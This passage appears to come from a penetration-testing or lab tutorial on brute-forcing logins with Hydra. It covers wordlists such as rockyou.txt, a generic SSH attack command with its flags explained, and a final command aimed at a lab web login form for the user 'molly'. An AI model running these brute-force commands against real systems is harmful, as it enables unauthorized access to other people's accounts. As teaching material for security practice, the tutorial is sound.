Step 3: Prepare Username and Password Lists

Hydra uses wordlists to attempt login combinations.

Example username list:

users.txt

Example password list:

passwords.txt

Common wordlists can be found in Kali:

/usr/share/wordlists/

One popular list is rockyou.txt.

Step 4: Perform Brute Force Attack

Now we use Hydra to attack the service.

Example command:

hydra -l admin -P passwords.txt ssh://<target-ip>

Explanation:

-l → single username

-P → password list

ssh:// → target protocol

Hydra will now start testing passwords from the wordlist.
 hydra -l  molly -P /usr/share/wordlists/rockyou.txt 10.49.131.149  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
